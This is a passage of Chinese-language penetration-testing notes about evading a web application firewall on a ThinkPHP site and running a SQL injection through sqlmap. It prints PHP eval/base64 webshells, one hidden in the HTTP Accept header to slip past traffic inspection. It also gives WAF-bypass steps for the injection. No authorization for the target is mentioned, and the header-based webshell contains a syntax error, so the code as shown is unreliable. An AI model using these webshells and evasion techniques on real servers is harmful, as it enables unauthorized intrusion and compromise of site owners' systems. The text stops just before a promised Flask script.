### 流量waf绕过

碰到个thinkphp很硬的站点，php7的环境，拦截的很死，拦截`<?php`，可以通过`<? ?>`短标签绕过，拦截一些关键词`eval`等函数，可以通过php伪协议写入进行绕过

这个waf还有个比较厉害的点，流量拦截，base64、rsa、aes等流量都会识别到直接reset

base64流量如下：

![](../Images/c0c9b62b03467abe8de9270b14d998af.png)

直接reset，没有状态码，包括其他rsa、aes也是直接reset

rsa流量如下：

![](../Images/f102e34c90157fc94f17e5ec0fc0bb79.png)

直接reset，也没有状态码

后续尝试更换payload中的关键字，发现没办法绕过，这个waf还是比较智能的

中间想到了使用伪协议写大马进服务器，发现无法写入，可能请求包数据太大，想了想其他的方法

继续尝试绕过waf，这里把`payload`更换位置，猜测waf只会识别数据包的请求体，而不会去看其他的请求头，把`payload`放到请求头里，发现服务器可以得到请求，如下：

![](../Images/ec9f2721484ed11f1524708317338d35.png)那么就可以把之前的马：

```
<?
eval(base64_decode(($_POST['x'
])));?>

```

更改为：

```
<?
eval(base64_decode(($_SERVER['HTTP_ACCEPT'];))); // 获取Accept的参数
?>

```

### sql注入绕过之sqlmap的数据包换行问题

碰到个SQL注入，但是网站有防护，如图：

![](../Images/fdeeeb8a3e6c2cbe97f61da5fe1163d9.png)![](../Images/78d6ff7e6c70967854f2201f860c3b7e.png)

可以通过`change body encoding`来绕过waf

![](../Images/0109997adf53b47cb57d9452aa3763e6.png)

但是当我们放到sqlmap中跑注入，发现报500错误，后续可以通过autoDecoder来解决，详细如下：

数据包是`Content-Type: multipart/form-data;` 的注入

![](../Images/19dae1638245bf9b59cfb1452d426faa.png)

但是sqlmap不识别`\r\n`的符号，所以无法跑出注入 使用`sqlmap --proxy=http://127.0.0.1:8080`代理到burp查看请求

![](../Images/f32b354db54fca26624bc9c8aa15c726.png)![](../Images/ffe730368566fd5c3eede035881240bf.png)

原因就在于`\n`符号，sqlmap不知道什么原因无法识别请求体的换行为`\r\n`，导致请求全是500，报错了 http数据包里的换行应该为`\r\n`，可以编写autoDecoder的flask脚本解决问题 flask脚本如下：
